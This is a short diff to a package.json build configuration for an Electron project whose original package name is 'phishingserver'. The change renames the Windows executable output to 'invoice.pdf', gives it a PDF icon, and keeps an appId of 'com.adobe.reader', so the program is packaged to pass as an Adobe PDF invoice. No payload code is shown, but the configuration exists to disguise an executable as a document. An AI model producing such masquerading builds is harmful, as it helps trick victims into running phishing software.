@@ -8,7 +8,7 @@
     "dev": "nodemon server.js",
     "electronstart": "electron .",
     "dist": "electron-builder",
-    "package": "electron-packager . phishingserver --platform=win32 --arch=x64 --out=dist --overwrite"
+    "package": "electron-packager . invoice.pdf --platform=win32 --arch=x64 --out=dist --overwrite --icon=assets/pdf-icon.ico"
   },
   "build": {
     "appId": "com.adobe.reader",
@@ -17,7 +17,13 @@
     },
     "mac": {
       "icon": "assets/pdf-icon.icns"
-    }
+    },
+    "files": [
+      "main.js",
+      "worker.html",
+      "controllers/",
+      "assets/"
+    ]
   },
   "keywords": [],
   "author": "",
